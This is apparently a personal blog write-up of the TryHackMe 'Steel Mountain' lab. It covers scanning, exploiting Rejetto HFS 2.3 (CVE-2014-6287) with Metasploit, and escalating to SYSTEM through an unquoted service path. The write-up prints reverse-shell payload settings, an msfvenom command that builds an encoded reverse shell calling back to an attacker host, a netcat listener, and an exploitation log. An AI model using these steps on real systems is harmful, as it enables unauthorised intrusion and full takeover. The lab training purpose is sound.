---
title: "Steel Mountain — TryHackMe Write-up"
date: 2026-08-20 12:00:00 +0530
categories: [TryHackMe]
tags: [steelmountain, privesc]
image:
  path: /assets/images/steel-mountain/banner.jpg
  alt: Steel Mountain
---

Welcome folks! This is a write-up for **Steel Mountain**, a free room on TryHackMe.

Room link: [tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)

> No flags (user/root) are shown in this write-up, so follow the procedures to grab the flags yourself!

## Task 1: Introduction

Before running an nmap scan, let's visit the given IP on the default port 80 and see what's there.

![Steel Mountain homepage]({{ '/assets/images/steel-mountain/homepage.png' | relative_url }})

We see an image of an "Employee of the Month." Checking the page source shows the image filename gives away the name.

![Page source showing image filename]({{ '/assets/images/steel-mountain/source-code.png' | relative_url }})

> Who is the employee of the month?

Answer: `Bill Harper`

## Task 2: Initial Access

Now let's run nmap and check open ports and service versions:

```bash
nmap -sV -sC -T4 -p- {IP} -oN nmap_basic
```

```
# Nmap 7.93 scan initiated Wed Apr 19 03:39:36 2023 as: nmap -sV -sC -T4 -p- -oN nmap_basic 10.10.239.241
Nmap scan report for 10.10.239.241
Host is up (0.12s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-04-18T07:34:42
|_Not valid after:  2023-10-18T07:34:42
|_ssl-date: 2023-04-19T07:47:29+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2023-04-19T07:47:24+00:00
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49172/tcp open  msrpc              Microsoft Windows RPC
49173/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
|   302:
|_    Message signing enabled but not required
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2023-04-19T07:47:22
|_  start_date: 2023-04-19T07:33:55
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02be36c76dcd (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 19 03:47:30 2023 -- 1 IP address (1 host up) scanned in 474.46 seconds
```

> Scan the machine with nmap. What is the other port running a web server on?

Answer: `8080`

Port 8080 is running an HTTP server called HFS. Visiting it shows it's HttpFileServer 2.3 (HFS) — specifically **Rejetto HTTP File Server**.

![HFS server info page]({{ '/assets/images/steel-mountain/hfs-server-info.png' | relative_url }})
![Rejetto HFS homepage]({{ '/assets/images/steel-mountain/rejetto-hfs.png' | relative_url }})

> Take a look at the other web server. What file server is running?

Answer: `Rejetto HTTP File Server`

Searching searchsploit confirms this version of HFS is vulnerable, with several exploits available:

```bash
searchsploit rejetto hfs
```

<!-- TODO: searchsploit screenshot not found in assets/images/steel-mountain/ yet — add the file and uncomment:
![searchsploit results]({{ '/assets/images/steel-mountain/searchsploit.png' | relative_url }}) -->

We'll use the Metasploit RCE exploit. Checking exploit-db gives the CVE number.

> What is the CVE number to exploit this file server?

Answer: `2014-6287`

### Exploiting with Metasploit

Fire up Metasploit and search for the Rejetto HTTP File Server module:

```
msf6 > search Rejetto HTTP file server
```

![metasploit module search]({{ '/assets/images/steel-mountain/msf-search.png' | relative_url }})

Set the options and run it:

- `RHOSTS` → victim machine IP
- `RPORT` → `8080`
- `LHOST` → your local/attacker IP
- payload → `windows/meterpreter/reverse_tcp`

```
msf6 exploit(windows/http/rejetto_hfs_exec) > run
[*] Started reverse TCP handler on 10.17.8.26:4444
[*] Using URL: http://10.17.8.26:8080/StVsHRMOS
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /StVsHRMOS
[*] Sending stage (175686 bytes) to 10.10.239.241
[!] Tried to delete %TEMP%\hRVLruGEhY.vbs, unknown result
[*] Meterpreter session 1 opened (10.17.8.26:4444 -> 10.10.239.241:49267) at 2023-04-19 04:39:01 -0400

meterpreter > getuid
Server username: STEELMOUNTAIN\bill
```

![Exploit run — session opened as STEELMOUNTAIN\bill]({{ '/assets/images/steel-mountain/exploit-run.png' | relative_url }})

We land a Meterpreter session as `STEELMOUNTAIN\bill`. The user flag is at `C:\Users\bill\Desktop\user.txt`:

```
meterpreter > cat user.txt
```

![user.txt flag (redacted)]({{ '/assets/images/steel-mountain/user-flag.png' | relative_url }})

> Use Metasploit to get an initial shell. What is the user flag?

Answer: *(redacted — grab it yourself!)*

## Task 3: Privilege Escalation

Time to escalate to Administrator. We'll use **PowerUp.ps1**, a PowerShell script that hunts for common Windows privilege-escalation misconfigurations.

Upload it and run it:

```
meterpreter > upload ./PowerUp.ps1
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

![PowerUp upload]({{ '/assets/images/steel-mountain/powerup-upload.png' | relative_url }})
![Invoke-AllChecks output]({{ '/assets/images/steel-mountain/invoke-allchecks.png' | relative_url }})

One result stands out — an **unquoted service path** with `CanRestart: True`:

```
ServiceName     : AdvancedSystemCareService9
Path            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath  : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName       : LocalSystem
AbuseFunction   : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart      : True
Name            : AdvancedSystemCareService9
Check           : Unquoted Service Paths
```

![Unquoted service path with CanRestart true]({{ '/assets/images/steel-mountain/unquoted-service-path.png' | relative_url }})

An unquoted service path with a space in it (`...\Advanced SystemCare\ASCService.exe`) gets interpreted left to right, trying `.exe` at each whitespace boundary. Since we're `bill`, and `bill` has write access to `C:\Program Files (x86)\IObit`, and the service can be restarted — we can drop a binary named `Advanced.exe` in that folder, and when the service (running as `LocalSystem`) restarts, Windows will execute `Advanced.exe` before ever reaching `ASCService.exe`.

Confirm the permissions:

```
PS > whoami
steelmountain\bill
PS > icacls 'C:\Program Files (x86)\IObit\Advanced SystemCare'
C:\Program Files (x86)\IObit\Advanced SystemCare STEELMOUNTAIN\bill:(I)(OI)(CI)(RX,W)
...
```

![icacls permissions output]({{ '/assets/images/steel-mountain/icacls.png' | relative_url }})

### Building and dropping the payload

Generate a reverse shell payload named `Advanced.exe`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe
```

![Generating Advanced.exe with msfvenom]({{ '/assets/images/steel-mountain/msfvenom.png' | relative_url }})

Upload it through the existing Meterpreter session:

```
meterpreter > upload Advanced.exe
```

![uploading Advanced.exe]({{ '/assets/images/steel-mountain/upload-advanced-exe.png' | relative_url }})

Start a listener on the attacker box:

```bash
nc -lvnp 1234
```

Drop to a shell in Meterpreter, stop the vulnerable service, copy the payload into the IObit folder, then restart the service:

```
meterpreter > shell
C:\> sc stop AdvancedSystemCareService9
C:\> copy Advanced.exe "C:\Program Files (x86)\IObit"
C:\> sc start AdvancedSystemCareService9
```

![copying Advanced.exe into IObit folder]({{ '/assets/images/steel-mountain/copy-advanced.png' | relative_url }})

As soon as the service starts, `Advanced.exe` fires and a shell connects back on the Netcat listener as `NT AUTHORITY\SYSTEM` / Administrator context. From there, grab the root flag on the Administrator's Desktop:

```
C:\Users\Administrator\Desktop>dir
 10/12/2020  12:05 PM    <DIR>          .
 10/12/2020  12:05 PM    <DIR>          ..
 10/12/2020  12:05 PM             1,528 activation.ps1
 09/27/2019  05:41 AM                32 root.txt

C:\Users\Administrator\Desktop>type root.txt
```

![root flag directory listing]({{ '/assets/images/steel-mountain/root-flag.png' | relative_url }})

> Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

Answer: `AdvancedSystemCareService9`

> What is the root flag?

Answer: *(redacted — grab it yourself!)*

## Lessons learned

- Outdated, unpatched software (Rejetto HFS 2.3) exposed on the network is an easy initial foothold — always check `searchsploit`/exploit-db for a service's version.
- Unquoted service paths combined with writable directories and service-restart rights are a classic and very practical Windows privesc vector — `PowerUp.ps1` (or `winPEAS`) makes these fast to spot.
- Least-privilege matters: `bill` never should have had write access to a directory backing a `LocalSystem` service.
